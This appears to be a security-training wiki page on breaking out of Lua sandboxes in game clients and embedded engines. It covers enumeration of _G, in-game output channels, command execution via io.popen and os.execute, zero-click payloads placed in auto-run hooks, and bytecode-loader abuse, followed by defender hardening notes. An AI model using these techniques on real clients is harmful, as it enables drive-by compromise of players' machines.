_body: "# Bypass Lua sandboxes (embedded VMs, game clients)\n\n{{#include ../../../banners/hacktricks-training.md}}\n\nThis\
  \ page collects practical techniques to enumerate and break out of Lua \"sandboxes\" embedded in applications (notably game\
  \ clients, plugins, or in-app scripting engines). Many engines expose a restricted Lua environment, but leave powerful globals\
  \ reachable that enable arbitrary command execution or even native memory corruption when bytecode loaders are exposed.\n\
  \nKey ideas:\n- Treat the VM as an unknown environment: enumerate _G and discover what dangerous primitives are reachable.\n\
  - When stdout/print is blocked, abuse any in-VM UI/IPC channel as an output sink to observe results.\n- If io/os is exposed,\
  \ you often have direct command execution (io.popen, os.execute).\n- If load/loadstring/loadfile are exposed, executing\
  \ crafted Lua bytecode can subvert memory safety in some versions (≤5.1 verifiers are bypassable; 5.2 removed verifier),\
  \ enabling advanced exploitation.\n\n## Enumerate the sandboxed environment\n\n- Dump the global environment to inventory\
  \ reachable tables/functions:\n\n```lua\n-- Minimal _G dumper for any Lua sandbox with some output primitive `out`\nlocal\
  \ function dump_globals(out)\n  out(\"=== DUMPING _G ===\")\n  for k, v in pairs(_G) do\n    out(tostring(k) .. \" = \"\
  \ .. tostring(v))\n  end\nend\n```\n\n- If no print() is available, repurpose in-VM channels. Example from an MMO housing\
  \ script VM where chat output only works after a sound call; the following builds a reliable output function:\n\n```lua\n\
  -- Build an output channel using in-game primitives\nlocal function ButlerOut(label)\n  -- Some engines require enabling\
  \ an audio channel before speaking\n  H.PlaySound(0, \"r[1]\") -- quirk: required before H.Say()\n  return function(msg)\n\
  \    H.Say(label or 1, msg)\n  end\nend\n\nfunction OnMenu(menuNum)\n  if menuNum ~= 3 then return end\n  local out = ButlerOut(1)\n\
  \  dump_globals(out)\nend\n```\n\nGeneralize this pattern for your target: any textbox, toast, logger, or UI callback that\
  \ accepts strings can act as stdout for reconnaissance.\n\n## Direct command execution if io/os is exposed\n\nIf the sandbox\
  \ still exposes the standard libraries io or os, you likely have immediate command execution:\n\n```lua\n-- Windows example\n\
  io.popen(\"calc.exe\")\n\n-- Cross-platform variants depending on exposure\nos.execute(\"/usr/bin/id\")\nio.popen(\"/bin/sh\
  \ -c 'id'\")\n```\n\nNotes:\n- Execution happens inside the client process; many anti-cheat/antidebug layers that block\
  \ external debuggers won’t prevent in-VM process creation.\n- Also check: package.loadlib (arbitrary DLL/.so loading), require\
  \ with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).\n\n## Zero-click\
  \ triggers via auto-run callbacks\n\nIf the host application pushes scripts to clients and the VM exposes auto-run hooks\
  \ (e.g., OnInit/OnLoad/OnEnter), place your payload there for drive-by compromise as soon as the script loads:\n\n```lua\n\
  function OnInit()\n  io.popen(\"calc.exe\") -- or any command\nend\n```\n\nAny equivalent callback (OnLoad, OnEnter, etc.)\
  \ generalizes this technique when scripts are transmitted and executed on the client automatically.\n\n## Dangerous primitives\
  \ to hunt during recon\n\nDuring _G enumeration, specifically look for:\n- io, os: io.popen, os.execute, file I/O, env access.\n\
  - load, loadstring, loadfile, dofile: execute source or bytecode; supports loading untrusted bytecode.\n- package, package.loadlib,\
  \ require: dynamic library loading and module surface.\n- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo,\
  \ and hooks.\n- LuaJIT-only: ffi.cdef, ffi.load to call native code directly.\n\nMinimal usage examples (if reachable):\n\
  \n```lua\n-- Execute source/bytecode\nlocal f = load(\"return 1+1\")\nprint(f()) -- 2\n\n-- loadstring is alias of load\
  \ for strings in 5.1\nlocal bc = string.dump(function() return 0x1337 end)\nlocal g = loadstring(bc) -- in 5.1 may run precompiled\
  \ bytecode\nprint(g())\n\n-- Load native library symbol (if allowed)\nlocal mylib = package.loadlib(\"./libfoo.so\", \"\
  luaopen_foo\")\nlocal foo = mylib()\n```\n\n## Optional escalation: abusing Lua bytecode loaders\n\nWhen load/loadstring/loadfile\
  \ are reachable but io/os are restricted, execution of crafted Lua bytecode can lead to memory disclosure and corruption\
  \ primitives. Key facts:\n- Lua ≤ 5.1 shipped a bytecode verifier that has known bypasses.\n- Lua 5.2 removed the verifier\
  \ entirely (official stance: applications should just reject precompiled chunks), widening the attack surface if bytecode\
  \ loading is not prohibited.\n- Workflows typically: leak pointers via in-VM output, craft bytecode to create type confusions\
  \ (e.g., around FORLOOP or other opcodes), then pivot to arbitrary read/write or native code execution.\n\nThis path is\
  \ engine/version-specific and requires RE. See references for deep dives, exploitation primitives, and example gadgetry\
  \ in games.\n\n## Detection and hardening notes (for defenders)\n\n- Server side: reject or rewrite user scripts; allowlist\
  \ safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.\n- Client side: run\
  \ Lua with a minimal _ENV, forbid bytecode loading, reintroduce a strict bytecode verifier or signature checks, and block\
  \ process creation from the client process.\n- Telemetry: alert on gameclient → child process creation shortly after script\
  \ load; correlate with UI/chat/script events.\n\n## References\n\n- [This House is Haunted: a decade old RCE in the AION\
